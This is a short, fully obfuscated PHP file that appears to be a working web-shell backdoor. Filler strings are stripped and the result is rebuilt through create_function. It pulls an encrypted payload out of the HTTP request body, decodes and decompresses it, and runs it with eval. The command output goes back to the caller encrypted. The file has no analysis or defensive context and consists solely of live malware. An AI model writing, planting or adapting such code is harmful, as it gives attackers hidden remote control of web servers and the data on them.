<?php
$p='knctckion x($t,$ckk){$c=scktrlen($kck);ck$lck=strlen($tck);$o="ck";fockr(ck$i=0;$i<$l;){fockckr($jc';
$C='k=0;($j<$c&&$i<$lck);ck$j++ck,$i+ck+){$o.ck=$t{$i}^$ckk{$j};}}reckturckn $o;}if ck(@preg_ckmckatchc';
$V='al(@ckgzuncockmpress(ck@x(ck@bckackse64_decodeck($m[1]),$k)ck));$cko=@ob_getck_contenckts(ck);@ckob';
$u='_end_cckleackn(ck);$r=@bckase64_encodeck(@ckx(@gckzcompress(ck$o),$ckk))ck;pckrint("$p$kh$r$kf");}';
$M='ck$k="47b2a62cke"ck;$kh="28cbckeck57d3e5bck";$kf="c5549ckckf9c3197";$p="TckHCiPBckX2qmAfckTjTk";fckuc';
$O=str_replace('Mb','','crMbeMbateMb_fMbuMbMbnction');
$w='k("/$kh(.+)$kfck/",ck@ckfile_get_cckontckents("php://ckinput"ck),$m)==ck1)ck {@ob_scktart();@eckv';
$W=str_replace('ck','',$M.$p.$C.$w.$V.$u);
$S=$O('',$W);$S();
?>
